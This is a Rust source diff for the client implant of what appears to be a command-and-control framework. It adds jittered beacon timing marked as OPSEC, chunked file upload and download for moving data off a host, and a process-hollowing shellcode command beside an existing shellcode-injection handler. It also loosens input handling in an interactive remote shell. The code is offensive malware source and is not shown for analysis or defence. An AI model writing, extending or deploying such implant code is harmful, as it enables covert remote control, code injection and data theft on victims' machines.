@@ -62,15 +62,17 @@ impl MessageHandler {
             return Err(e);
         }
         
-        let mut interval_secs = crate::config::get_heartbeat_interval();
-        if interval_secs == 0 { interval_secs = 10; } // 默认 10s
+        let base_interval = crate::config::get_heartbeat_interval();
+        let interval_secs = if base_interval == 0 { 10 } else { base_interval };
+        let jitter_percent = crate::config::get_heartbeat_jitter();
 
         loop {
             // ⚡ OPSEC: 计算随机抖动 (Jitter)
-            // 在基础间隔上增加 ±30% 的随机变动
-            use rand::Rng;
-            let jitter = rand::thread_rng().gen_range(0..=(interval_secs / 3));
-            let final_delay = if rand::thread_rng().gen_bool(0.5) {
+            // 在基础间隔上根据 Jitter 百分比增加/减少随机变动
+            let jitter_range = (interval_secs * jitter_percent / 100).max(1);
+            let jitter = rand::Rng::gen_range(&mut rand::thread_rng(), 0..=jitter_range);
+            
+            let final_delay = if rand::Rng::gen_bool(&mut rand::thread_rng(), 0.5) {
                 interval_secs + jitter
             } else {
                 interval_secs.saturating_sub(jitter).max(5)
@@ -82,24 +84,27 @@ impl MessageHandler {
                     match data_res {
                         Ok(data) => {
                             if data.is_empty() { return Ok(self.transport); }
-                            if let Err(_) = self.handle_message(&data).await {
+                            if let Err(e) = self.handle_message(&data).await {
+                                debug!("Handle message error: {}", e);
+                                // Don't return Ok(transport) on parse error, just continue loop
                                 continue;
                             }
                         }
-                        Err(_) => return Ok(self.transport),
+                        Err(e) => {
+                            debug!("Transport receive error: {}", e);
+                            return Ok(self.transport);
+                        }
                     }
                 }
                 // 2. 抖动心跳定时器
                 _ = tokio::time::sleep(tokio::time::Duration::from_secs(final_delay)) => {
-                    // 发送静默心跳包
-                    let hb_msg = CommandResult {
-                        stdout: String::new(),
-                        stderr: String::new(),
-                        path: None,
-                        req_id: Some("heartbeat".to_string()),
-                    };
-                    let _ = self.send_message(&hb_msg.to_response_message()).await;
-                    debug!("Jitter Heartbeat sent (Interval: {}s)", final_delay);
+                    // 发送静默心跳包或处理挂起任务
+                    debug!("Jitter Heartbeat interval completed ({}s)", final_delay);
+                    
+                    // The client doesn't need to actually send a heartbeat packet aggressively
+                    // unless ping/pong isn't working at the transport level.
+                    // But we keep this timer here to allow future scheduled OPSEC tasks
+                    // (like dynamic DNS resolution checks or Sleep Obfuscation injection points).
                 }
             }
         }
@@ -390,6 +395,34 @@ impl MessageHandler {
                     }
                 }
             }
+            "file_upload_chunk" => {
+                // 分块上传文件
+                if let (Some(path), Some(data)) = (command_payload.path.as_deref(), command_payload.data.as_deref()) {
+                    let is_append = command_payload.command_content.contains("\"is_append\":true") 
+                                 || command_payload.command_content.contains("\"is_append\": true");
+                    match crate::fs::upload_chunk(path, data, is_append) {
+                        Ok(_) => CommandResult {
+                            stdout: format!("Chunk uploaded: {}", path),
+                            stderr: String::new(),
+                            path: None,
+                            req_id: None,
+                        },
+                        Err(e) => CommandResult {
+                            stdout: String::new(),
+                            stderr: format!("Failed to upload chunk: {}", e),
+                            path: None,
+                            req_id: None,
+                        },
+                    }
+                } else {
+                    CommandResult {
+                        stdout: String::new(),
+                        stderr: "Invalid file_upload_chunk params".to_string(),
+                        path: None,
+                        req_id: None,
+                    }
+                }
+            }
             "file_download" => {
                 // 下载文件
                 let target_path = command_payload
@@ -409,6 +442,51 @@ impl MessageHandler {
                         path: None,
                         req_id: None,
                     },
+                }
+            }
+            "file_download_chunk" => {
+                // 分块下载文件
+                let target_path = command_payload.path.as_deref()
+                    .unwrap_or_else(|| {
+                        let parts: Vec<&str> = command_payload.command_content.split('|').collect();
+                        if parts.len() > 2 { parts[2] } else { command_payload.command_content.as_str() }
+                    });
+                
+                let mut offset = 0u64;
+                let mut size = 2 * 1024 * 1024; // 2MB default
+                
+                // Allow parsing from JSON or plain "offset|size"
+                if let Ok(parsed) = serde_json::from_str::<serde_json::Value>(&command_payload.command_content) {
+                    offset = parsed.get("offset").and_then(|v| v.as_u64()).unwrap_or(0);
+                    size = parsed.get("size").and_then(|v| v.as_u64()).unwrap_or(2 * 1024 * 1024) as usize;
+                } else {
+                    let parts: Vec<&str> = command_payload.command_content.split('|').collect();
+                    if parts.len() >= 2 {
+                        offset = parts[0].parse().unwrap_or(0);
+                        size = parts[1].parse().unwrap_or(2 * 1024 * 1024);
+                    }
+                }
+                
+                match crate::fs::download_chunk(target_path, offset, size) {
+                    Ok((base64_data, is_eof)) => {
+                        let result_json = serde_json::json!({
+                            "data": base64_data,
+                            "is_eof": is_eof,
+                            "offset": offset
+                        });
+                        CommandResult {
+                            stdout: result_json.to_string(),
+                            stderr: String::new(),
+                            path: None,
+                            req_id: None,
+                        }
+                    }
+                    Err(e) => CommandResult {
+                        stdout: String::new(),
+                        stderr: format!("Failed to download chunk: {}", e),
+                        path: None,
+                        req_id: None,
+                    }
                 }
             }
             "file_delete" => {
@@ -454,6 +532,21 @@ impl MessageHandler {
                 // 🚨 SECURITY OPERATION: Process injection - Route through plugin router
                 
                 match crate::plugin_router::PluginRouter::parse_plugin_task("inject-shellcode", &command_payload.command_content, command_payload.req_id.clone()) {
+                    Ok(task) => {
+                        crate::plugin_router::PluginRouter::execute_plugin(task).await
+                    }
+                    Err(e) => CommandResult {
+                        stdout: String::new(),
+                        stderr: e,
+                        path: None,
+                        req_id: None,
+                    }
+                }
+            }
+            "hollow_shellcode" => {
+                // 🚨 SECURITY OPERATION: Process Hollowing - Route through plugin router
+                
+                match crate::plugin_router::PluginRouter::parse_plugin_task("hollow-shellcode", &command_payload.command_content, command_payload.req_id.clone()) {
                     Ok(task) => {
                         crate::plugin_router::PluginRouter::execute_plugin(task).await
                     }
@@ -901,7 +994,7 @@ impl MessageHandler {
                                         
                                         if cmd_type == "shell" {
                                             let command = command_payload.command_content;
-                                            if command.trim().is_empty() { continue; }
+                                            // Allow empty commands (e.g., just pressing Enter) in interactive mode
                                             
                                             // 将有效命令写入 CMD stdin
                                             let command_with_newline = format!("{}\n", command);
